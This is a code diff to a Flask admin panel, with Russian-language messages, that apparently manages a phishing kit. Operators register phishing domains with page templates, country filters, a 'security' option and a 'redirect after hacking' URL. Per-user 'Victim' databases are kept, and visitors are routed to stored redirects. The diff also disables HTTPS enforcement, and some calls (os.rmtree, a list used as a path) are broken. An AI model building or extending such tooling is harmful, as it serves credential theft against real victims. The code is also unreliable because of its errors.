@@ -9,7 +9,7 @@ import os
 import re
 from datetime import datetime
 from config import salt, server_domain
-
+import validators
 
 db = User('./users.db', 'users')
 
@@ -31,11 +31,11 @@ def is_valid_domain(domain):
 
 
 
-@app.before_request
-def enforce_https():
-    if request.headers.get('X-Forwarded-Proto', 'http') == 'http':
-        https_url = request.url.replace('http://', 'https://', 1)
-        return redirect(https_url, code=301)
+# @app.before_request
+# def enforce_https():
+#     if request.headers.get('X-Forwarded-Proto', 'http') == 'http':
+#         https_url = request.url.replace('http://', 'https://', 1)
+#         return redirect(https_url, code=301)
 
 
 
@@ -43,18 +43,24 @@ def enforce_https():
 
 @app.route('/')
 def index():
-    domain = request.headers.get('Host')
+    host = request.headers.get('Host')
     
-    if domain == server_domain:
+    if host == server_domain:
         return redirect(url_for('panel'))
     else:
         try:
             path = request.args.get('path', None)
-            url = domain + '$' + path
+            url = host + '$' + path
             username = os.listdir(f'templates/domains/{url}/')[0]
             return render_template(f'domains/{url}/{username}')
         except:
-            return redirect("https://" + domain)
+            domains = os.listdir(f'templates/domains/')
+            for domain in domains:
+                if host in domain:
+                    username = os.listdir(f'templates/domains/{domain}/')
+                    db_victim = Victim(f'./users/{username}/database.db')
+                    url_redirect = db_victim.GetRedirect()
+                    return redirect(url_redirect[0])
 
 
 
@@ -214,6 +220,14 @@ def remove_user():
         user = db.GetUserBy('username', username)
 
         if user:
+            db_victim = Victim(f'./users/{username}/database.db')
+            phishes = db_victim.GetDomains()
+            domains = os.listdir(f'templates/domains/')
+            
+            for i in range(0, len(phishes)):
+                for host in domains:
+                    if host.startswith(phishes[i]):
+                        os.rmtree(f'./templates/domains/{host}')
             db.RemoveUser(username)
             response = {'status': 'success', 'message': 'Пользователь успешно удалён'}
         else:
@@ -314,14 +328,31 @@ def add_domain():
         page = request.form.get('page')
         path = request.form.get('path')
         redirect = request.form.get('redirect')
+        redirect_success = request.form.get('redirect_success')
+        security = request.form.get('security')
 
-        if not countries or not domain or not page or not redirect:
-            return jsonify({'status': 'error', 'message': 'Неверно заполнена форма'})
+        if not countries or not domain or not page or not redirect or not path or not redirect_success or not security:
+            return jsonify({'status': 'error', 'message': 'Заполните полностью форму'})
         else:
-            if is_valid_domain(domain):
+            if not validators.url(redirect):
+                return jsonify({'status': 'error', 'message': 'Неверная ссылка на редирект с главной страницы, пример: https://link.com'})
+            if not validators.url(redirect_success):
+                return jsonify({'status': 'error', 'message': 'Неверная ссылка на редирект после взлома, пример: https://link.com'})
+            if not is_valid_domain(domain):
+                return jsonify({'status': 'error', 'message': 'Неверный домен, домен должен быть первого уровня и без протоколов'})
+
+            db_victim = Victim(f'./users/{username}/database.db')
+
+            if db_victim.CheckDomain(domain):
+                return jsonify({'status': 'error', 'message': 'Этот домен уже добавлен'})
+            
+            data = db_victim.AddDomain(domain, page, path, security, redirect, countries, redirect_success, username)
+
+            if data[0]:
                 return jsonify({'status': 'success', 'message': 'Успешно добавлен домен'})
             else:
-                return jsonify({'status': 'error', 'message': 'Неверный домен, домен должен быть первого уровня и без протоколов'})
+                return jsonify({'status': 'error', 'message': data[1]})
+            
     else:
         return jsonify({'status': 'error', 'message': 'Нет доступа'})
 
